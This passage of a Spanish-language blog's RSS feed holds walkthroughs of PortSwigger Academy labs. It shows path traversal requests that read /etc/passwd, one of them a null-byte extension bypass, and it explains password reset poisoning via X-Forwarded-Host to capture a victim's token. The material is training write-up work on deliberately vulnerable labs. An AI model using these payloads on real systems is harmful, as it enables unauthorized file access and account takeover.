&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Directory Traversal Lab 5</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/</link>
        <pubDate>Sun, 28 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/head.png" alt="Featured image of post Portswigger Academy Learning Path: Directory Traversal Lab 5" /&gt;&lt;h1 id=&#34;lab-file-path-traversal-validation-of-start-of-path&#34;&gt;Lab: File path traversal, validation of start of path&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder recuperar el archivo &lt;code&gt;/etc/passwd&lt;/code&gt; todo esto en una vulnerabilidad la cual es la que desplega las imagenes.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web muestra un post el cual contiene contenido y una imagen.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 111; 
			flex-basis: 267px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/web.png&#34; data-size=&#34;1806x1622&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/web.png&#34;
			width=&#34;1806&#34;
			height=&#34;1622&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/web_hu33d88c37511bbec648b3b335d01b4a6b_1352086_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/web_hu33d88c37511bbec648b3b335d01b4a6b_1352086_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero viendo burpsuite podemos ver que se hace la peticion para poder recuperar la imagen y mostrarla&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 169; 
			flex-basis: 407px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/request.png&#34; data-size=&#34;1542x908&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/request.png&#34;
			width=&#34;1542&#34;
			height=&#34;908&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/request_hu129f5ccbb9ffdc599f31bc31975919c5_247981_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/request_hu129f5ccbb9ffdc599f31bc31975919c5_247981_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Lo que sabemos es que el backend pide que se ingrese la ruta absoluta de las imagenes que al ver la peticion es &lt;code&gt;/var/www/images/&lt;/code&gt; en este caso la solucion es saltarlo ingresando el path al inicio pero se agrega siempre los caracteres para volver al path de raiz en este caso &lt;code&gt;../../../&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Y realizamos la peticion:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y obtenemos el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 249; 
			flex-basis: 597px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/request2.png&#34; data-size=&#34;1539x618&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/request2.png&#34;
			width=&#34;1539&#34;
			height=&#34;618&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/request2_hu1b4dea58a7d53b81a7b3a146c1b41652_119703_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/request2_hu1b4dea58a7d53b81a7b3a146c1b41652_119703_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 284; 
			flex-basis: 681px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/resuelto.png&#34; data-size=&#34;1778x626&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/resuelto.png&#34;
			width=&#34;1778&#34;
			height=&#34;626&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/resuelto_hub01c952f011729171e71abcf6c384d94_78087_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-5/resuelto_hub01c952f011729171e71abcf6c384d94_78087_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Directory Traversal Lab 6</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/</link>
        <pubDate>Sun, 28 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/head.png" alt="Featured image of post Portswigger Academy Learning Path: Directory Traversal Lab 6" /&gt;&lt;h1 id=&#34;lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass&#34;&gt;Lab: File path traversal, validation of file extension with null byte bypass&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder recuperar el archivo &lt;code&gt;/etc/passwd&lt;/code&gt; todo esto en una vulnerabilidad la cual es la que desplega las imagenes.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La web muestra un post el cual contiene contenido y una imagen.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 217; 
			flex-basis: 522px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/web.png&#34; data-size=&#34;1777x816&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/web.png&#34;
			width=&#34;1777&#34;
			height=&#34;816&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/web_hu1f914a41a1810c682b18c1e6fac67c58_281117_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/web_hu1f914a41a1810c682b18c1e6fac67c58_281117_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hasta ahi todo bien pero viendo burpsuite podemos ver que se hace la peticion para poder recuperar la imagen y mostrarla&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 178; 
			flex-basis: 428px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/request.png&#34; data-size=&#34;1532x858&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/request.png&#34;
			width=&#34;1532&#34;
			height=&#34;858&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/request_hu89159de4e0a86c93397e49a358fa3a07_239860_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/request_hu89159de4e0a86c93397e49a358fa3a07_239860_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de imagen&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de imagen&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Lo que sabemos es que el backend valida que la aplicacion termine en formato .jpg para poder hacer la solicitud, pero en este caso existe una forma de ya no validar lo que sigue despues del .jpg para evitar que no se muestre &lt;code&gt;/etc/passwd&lt;/code&gt; y es &lt;code&gt;%00&lt;/code&gt; que lo que hara es insertar un bit nulo.&lt;/p&gt;
&lt;p&gt;Y realizamos la peticion:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Y obtenemos el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 244; 
			flex-basis: 585px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/request2.png&#34; data-size=&#34;1533x628&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/request2.png&#34;
			width=&#34;1533&#34;
			height=&#34;628&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/request2_hu05b0579d4e7b71678c8b7d772e1a4831_117032_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/request2_hu05b0579d4e7b71678c8b7d772e1a4831_117032_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud de archivo passwd&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud de archivo passwd&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resuelto el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 167; 
			flex-basis: 402px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/resuelto.png&#34; data-size=&#34;1746x1040&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/resuelto.png&#34;
			width=&#34;1746&#34;
			height=&#34;1040&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/resuelto_hu769fad77d05f1272fdef66a04e258eb2_408565_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-directory-traversal-lab-6/resuelto_hu769fad77d05f1272fdef66a04e258eb2_408565_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 13</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/</link>
        <pubDate>Fri, 26 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 13" /&gt;&lt;h1 id=&#34;lab-password-reset-poisoning-via-middleware&#34;&gt;Lab: Password reset poisoning via middleware&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es aprovecharse de una vulnerabilidad en la recuperacion de contrasena, la cual permite que un usuario pueda hacerse con otra cuenta por la mala implementacion de esta funcion.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La pagina consta de un inicio de sesion el cual, tiene una parte de recuperacion de contrasena, y si colocamos el usuario de &lt;code&gt;wiener&lt;/code&gt; recibimos un correo con el link para recuperar la contrasena. Todo funciona bien al parecer.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 325; 
			flex-basis: 780px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/form.png&#34; data-size=&#34;1142x351&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/form.png&#34;
			width=&#34;1142&#34;
			height=&#34;351&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/form_hu45194fe7501f149d657c40469f47e766_17420_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/form_hu45194fe7501f149d657c40469f47e766_17420_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Recuperacion ingresando nombre de usuario&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Recuperacion ingresando nombre de usuario&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Luego recibiremos el siguiente correo:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 262; 
			flex-basis: 630px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/email.png&#34; data-size=&#34;1777x676&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/email.png&#34;
			width=&#34;1777&#34;
			height=&#34;676&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/email_hu4d30352ac233d75ac7244d145dd14ceb_127530_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/email_hu4d30352ac233d75ac7244d145dd14ceb_127530_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Correo de recuperacion de contrasena&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Correo de recuperacion de contrasena&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Si abrimos el link nos enviara a ingresar la nueva contrasena del usuario.&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora como se podria explotar algo asi ya que todo funciona muy bien, pero hay un error, a la hora de la creacion del link que se le envia al usuario victima se puede craftear para que tome un host del atacante y nosotros posteriormente cuando el usuario abra el link poder capturar el token. El diagrama de ataque seria el siguiente:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/ataque.svg&#34; &gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/ataque.svg&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;Diagrama de ataque&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Diagrama de ataque&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora realizamos todo el proceso de recuperacion de la contrasena y capturamos cuando se envia el usuario al que se piensa recuperar la contrasena, que es cuando se toma el host para enviar el correo. En este caso lo que queremos es que tome otro host y no el que es enviado en &lt;code&gt;Host:&lt;/code&gt; para eso existen maneras de modificarlo, si se agrega otro Host da error pero si se agrega &lt;code&gt;X-Forwarded-Host&lt;/code&gt; si lo toma y envia el correo hacia la victima con el host que se le indica en el header.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The &lt;code&gt;X-Forwarded-Host&lt;/code&gt; (XFH) header is a de-facto standard header for identifying the original host requested by the client in the Host HTTP request header.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 198; 
			flex-basis: 475px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/request.png&#34; data-size=&#34;1513x763&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/request.png&#34;
			width=&#34;1513&#34;
			height=&#34;763&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/request_hub0ca1253e188b0824be8865c8273fe62_139887_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/request_hub0ca1253e188b0824be8865c8273fe62_139887_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud hacia el servidor&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud hacia el servidor&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Este seria el link que recibiria la victima con la url del atacante que se le indico en el header &lt;code&gt;X-Forwarded-Host&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 298; 
			flex-basis: 717px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/mail.png&#34; data-size=&#34;1751x586&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/mail.png&#34;
			width=&#34;1751&#34;
			height=&#34;586&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/mail_hu023ea08e79381d55b9a6b64a232fde99_121235_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/mail_hu023ea08e79381d55b9a6b64a232fde99_121235_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Correo recibido por la victima&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Correo recibido por la victima&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y cuando llega a la victima este lo abrira pero vera la pagina falsa y nosotros capturaremos el token para posteriormente nosotros ingresarlo manual a la pagina verdadera:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 164; 
			flex-basis: 393px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/log.png&#34; data-size=&#34;1653x1007&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/log.png&#34;
			width=&#34;1653&#34;
			height=&#34;1007&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/log_hu3268a1b9ad31feb8605f15d2608eb3ba_541982_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/log_hu3268a1b9ad31feb8605f15d2608eb3ba_541982_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Captura del token de la victima&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Captura del token de la victima&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora abrimos la pagina web y nos pide las credenciales nuevas para el usuario carlos:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 149; 
			flex-basis: 359px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/password.png&#34; data-size=&#34;1149x767&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/password.png&#34;
			width=&#34;1149&#34;
			height=&#34;767&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/password_hua577c2c58be967a92dcfd46698598126_70154_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/password_hua577c2c58be967a92dcfd46698598126_70154_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Seteando nuevas credenciales para el usuario carlos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Seteando nuevas credenciales para el usuario carlos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al finalizar esta solicitud ya podriamos ingresar con el usuario carlos y la nueva contrasena que hemos colocado y resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 184; 
			flex-basis: 441px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/resuelto.png&#34; data-size=&#34;1742x946&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/resuelto.png&#34;
			width=&#34;1742&#34;
			height=&#34;946&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/resuelto_huf4059c99d6ed2b295175905cc4774812_104575_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-13/resuelto_huf4059c99d6ed2b295175905cc4774812_104575_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 14</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/</link>
        <pubDate>Fri, 26 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 14" /&gt;&lt;h1 id=&#34;lab-password-brute-force-via-password-change&#34;&gt;Lab: Password brute-force via password change&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es aprovecharse de una vulnerabilidad en la funcion de cambio de contrasena.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La pagina consta de un inicio de sesion el cual se puede ingresar con el usuario &lt;code&gt;wiener&lt;/code&gt; y cuando vemos podemos cambiar la contrasena de nuestro usuario.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 119; 
			flex-basis: 285px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/changepassword.png&#34; data-size=&#34;1131x950&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/changepassword.png&#34;
			width=&#34;1131&#34;
			height=&#34;950&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/changepassword_huf75fafe240c193e69b082da40a9dddeb_53468_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/changepassword_huf75fafe240c193e69b082da40a9dddeb_53468_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Actualizacion de contrasena&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Actualizacion de contrasena&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
